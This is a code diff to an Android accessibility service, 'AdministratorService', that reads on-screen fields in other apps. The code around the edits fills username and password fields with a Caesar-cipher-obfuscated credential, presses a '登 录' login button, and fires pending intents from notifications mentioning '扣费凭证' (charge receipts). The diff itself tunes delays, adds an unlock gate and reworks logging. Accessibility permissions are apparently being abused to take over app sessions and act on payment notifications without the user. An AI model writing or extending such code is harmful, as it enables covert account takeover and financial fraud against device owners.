@@ -13,7 +13,6 @@ import com.megatronus.ui.utils.sudo;
 import java.util.List;
 import com.megatronus.ui.EditBillActivity;
 import com.megatronus.ui.MyApp;
-import android.util.Log;
 import android.webkit.WebView;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import java.util.ArrayList;
@@ -23,6 +22,7 @@ import android.widget.TextView;
 import android.util.Base64;
 import com.megatronus.ui.utils.CaesarCipher;
 import com.megatronus.ui.R;
+import com.megatronus.ui.utils.Log;
 
 public class AdministratorService extends BaseAccessibilityService
 {
@@ -133,9 +133,14 @@ public class AdministratorService extends BaseAccessibilityService
 		{
 
 
+			if(!((MyApp)getApplication()).bLock){
+				Log.normal("not unlock");
+				return ;
+			}
+			
 			try
 			{
-			Thread.sleep(1000);
+			Thread.sleep(500);
 			}
 			catch (InterruptedException e) {}
 			
@@ -144,7 +149,7 @@ public class AdministratorService extends BaseAccessibilityService
 			List<AccessibilityNodeInfo> nodearr = findEveryViewNode(getRootInActiveWindow(), new String[]{EditText.class.getName(),}, null);
 			for (AccessibilityNodeInfo i : nodearr)
 			{
-				log("fff" + i.getViewIdResourceName());
+				Log.normal("fff" + i.getViewIdResourceName());
 
 				if (i.getViewIdResourceName().equals("u"))
 				{
@@ -153,6 +158,13 @@ public class AdministratorService extends BaseAccessibilityService
 					flag ++ ;
 				}
 
+				try
+			{
+			Thread.sleep(300);
+			}
+			catch (InterruptedException e) {}
+			
+				
 				if (i.getViewIdResourceName().equals("p"))
 				{
 					String e = new CaesarCipher().decode(getApplicationContext().getResources().getString(R.string.app_name),"ogicvtqpwu",2);
@@ -162,12 +174,18 @@ public class AdministratorService extends BaseAccessibilityService
 				}
 			}
 
+			try
+			{
+			Thread.sleep(200);
+			}
+			catch (InterruptedException e) {}
+			
 			if (flag == 2)
 			{
 				for (AccessibilityNodeInfo login : findEveryViewNode(getRootInActiveWindow(), new String[]{View.class.getName()}, new String[]{"登 录"}))
 				{
-
 					ViewClick(login);
+					Log.normal("login");
 				}
 			}
 		}
@@ -202,7 +220,7 @@ public class AdministratorService extends BaseAccessibilityService
 
 
 
-			log(packageName.toString() + " Class Name : " + event.getClassName());
+			Log.normal(packageName.toString() + " Class Name : " + event.getClassName());
 			mOldPackageName = packageName ;
 			System.gc();
 		}
@@ -228,21 +246,16 @@ public class AdministratorService extends BaseAccessibilityService
 				return list;
 			}
 
-			log("444ffffff4 //////+" + rootView.getChildCount());
+			Log.normal("444ffffff4 //////+" + rootView.getChildCount());
 
-			log(child.getClassName().toString());
+			Log.normal(child.getClassName().toString());
 			//log(n.getText().toString());
 
 			for (String name : className)
 			{
 				if (name.equals(child.getClassName().toString()))
 				{
-					log("4/////+");
-
-
-
-
-
+					Log.normal("4/////+");
 
 					if (context == null)
 					{
@@ -251,7 +264,7 @@ public class AdministratorService extends BaseAccessibilityService
 					else
 						for (String text : context)
 						{
-							if (text.contains(child.getText().toString()))
+							if (child.getText().toString().contains(text))
 							{
 								list.add(child);
 							}
@@ -263,7 +276,7 @@ public class AdministratorService extends BaseAccessibilityService
 			//debug
 			try
 			{
-				log(child.getText().toString());
+				Log.normal(child.getText().toString());
 			}
 			catch (Exception e)
 			{
@@ -360,7 +373,7 @@ public class AdministratorService extends BaseAccessibilityService
 			Notification notification ;
             for (CharSequence charSequence : text)
 			{
-				log(charSequence.toString());
+				Log.normal(charSequence.toString());
 
 
 				if (event.getParcelableData() != null && event.getParcelableData() instanceof Notification)
@@ -379,7 +392,7 @@ public class AdministratorService extends BaseAccessibilityService
 					{
 						if (String.valueOf(charSequence).contains("扣费凭证"))
 						{
-							log(charSequence + "扣费凭证");
+							Log.normal(charSequence + "扣费凭证");
 							try
 							{
 								pendingIntent.send();
@@ -387,7 +400,7 @@ public class AdministratorService extends BaseAccessibilityService
 							}
 							catch (PendingIntent.CanceledException e)
 							{
-								log(e.getMessage());
+								Log.normal(e.getMessage());
 							}
 						}
 					}
@@ -398,9 +411,4 @@ public class AdministratorService extends BaseAccessibilityService
 		}
 	}
 
-
-	private void log(String text)
-	{
-		Log.e("AdministratorService", text);
-	}
 }
